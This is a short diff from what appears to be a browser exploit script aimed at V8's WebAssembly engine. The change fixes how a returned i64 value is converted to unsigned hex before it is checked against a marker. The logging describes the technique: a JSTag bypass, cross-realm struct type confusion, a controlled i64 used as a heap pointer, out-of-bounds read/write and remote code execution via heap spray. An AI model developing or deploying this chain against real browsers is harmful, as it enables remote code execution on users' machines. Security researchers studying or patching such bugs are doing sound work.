@@ -413,13 +413,16 @@ async function chainB() {
   }
 
   if (result !== undefined) {
-    L.crit('run() returned: 0x' + result.toString(16));
-    if (result === MARKER) {
+    // wasm i64 → JS BigInt is signed; reinterpret as unsigned for comparison
+    const u64 = result < 0n ? result + (1n << 64n) : result;
+    const hex = '0x' + u64.toString(16).padStart(16, '0');
+    L.crit('run() returned (unsigned i64): ' + hex);
+    if (u64 === MARKER) {
       L.crit('CONFIRMED: controlled i64 injected via cross-realm struct $B');
       L.crit('Primitive: JSTag bypass → cross-realm struct $B{val} → iframe i64 = val');
       L.crit('With heap spray: controlled i64 as V8 heap pointer → OOB r/w → RCE');
     } else {
-      L.bug('Got: 0x' + result.toString(16) + ' (expected MARKER — may be GC header offset)');
+      L.bug('Got: ' + hex + ' (expected 0x' + MARKER.toString(16) + ')');
     }
   }
 }
